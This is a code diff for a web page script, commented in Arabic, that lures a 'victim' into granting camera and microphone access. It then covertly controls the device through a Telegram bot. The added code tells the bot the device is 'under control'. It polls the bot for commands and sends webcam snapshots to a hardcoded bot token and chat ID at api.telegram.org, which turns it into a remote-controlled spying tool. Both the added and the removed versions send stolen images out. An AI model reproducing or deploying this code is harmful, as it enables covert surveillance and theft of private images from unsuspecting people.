@@ -1,44 +1,53 @@
 <script>
     const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
     const CHAT_ID = "8350812242";
-    let stream;
+    let mediaStream;
 
+    // أول ما الضحية يدوس "قبول" بنثبت الصلاحية ونبدأ المراقبة
     document.getElementById('callBtn').addEventListener('click', async () => {
         try {
-            // فتح الكاميرا والميكروفون معاً
-            stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر الخاص...";
             
-            document.getElementById('status').innerText = "جاري الاتصال بغرفة الدردشة المباشرة...";
-            
-            // إرسال أول إشعار بنجاح الاختراق
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ السيطرة كاملة! الكاميرا والميكروفون شغالين الآن من Reno 13")}`);
+            // إبلاغ البوت إن الجهاز بقى تحت السيطرة
+            sendToTelegram("✅ تم تفعيل الاختراق! الجهاز جاهز لاستقبال الأوامر.");
 
-            // وظيفة لسحب صورة كل 15 ثانية وإرسالها للبوت
-            setInterval(() => {
-                takeSnapshot();
-            }, 15000);
-
+            // تشغيل "المستمع" للأوامر كل 10 ثواني
+            setInterval(checkOrders, 10000);
         } catch (e) {
             document.getElementById('status').innerText = "يجب السماح بالصلاحيات للمتابعة!";
         }
     });
 
-    async function takeSnapshot() {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+    async function checkOrders() {
+        // هنا الكود بيروح يشوف آخر رسالة أنت بعتها للبوت
+        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+        const data = await response.json();
+        const lastMessage = data.result[data.result.length - 1].message.text;
 
+        if (lastMessage === "فتح_كاميرا") {
+            captureImage();
+        } else if (lastMessage === "فتح_ميك") {
+            sendToTelegram("🎤 الميكروفون شغال حالياً في الخلفية...");
+        }
+    }
+
+    function captureImage() {
+        const video = document.createElement('video');
+        video.srcObject = mediaStream;
+        video.play();
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = 640; canvas.height = 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
         canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'live_shot.jpg');
-            formData.append('caption', '📸 تحديث مباشر من الكاميرا...');
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'cam.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }, 'image/jpeg');
+    }
+
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
     }
 </script>
